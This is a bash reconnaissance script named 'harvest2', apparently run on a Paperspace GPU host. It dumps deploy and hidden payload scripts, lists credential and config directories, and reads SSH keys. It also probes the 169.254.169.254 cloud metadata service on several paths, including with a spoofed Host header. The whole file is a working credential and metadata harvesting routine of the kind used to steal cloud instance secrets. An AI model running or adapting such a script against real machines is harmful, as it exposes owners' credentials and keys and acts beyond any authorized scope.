#!/bin/bash
echo "=== harvest2 $(date -u) host=$(hostname)"
echo "--- deploy script"; cat /root/deploy_h100_89033.sh 2>/dev/null | head -60
echo "--- payload scripts"; for f in /root/.i120193_payload_*.sh; do echo "== $f"; head -25 "$f"; done
echo "--- root gpu dir"; ls -la /root/gpu 2>/dev/null | head
echo "--- paperspace creds"; ls -la /home/paperspace/.paperspace /home/paperspace/.config 2>/dev/null | head -12
find /home/paperspace -maxdepth 2 -name '*.json' -o -maxdepth 2 -name '*config*' 2>/dev/null | head -12
echo "--- metadata probes"
for u in / /v1/ /latest/meta-data/ /metadata/v1/ /machine /api /v1/machines; do
  echo "-- GET $u"; timeout 3 curl -s -i "http://169.254.169.254$u" 2>&1 | head -8
done
echo "--- host header probe"; timeout 3 curl -s -i -H 'Host: metadata.paperspace.com' http://169.254.169.254/v1/ 2>&1 | head -10
echo "--- ssh keys"; cat /home/paperspace/.ssh/authorized_keys 2>/dev/null | head -3; ls -la /root/.ssh 2>/dev/null
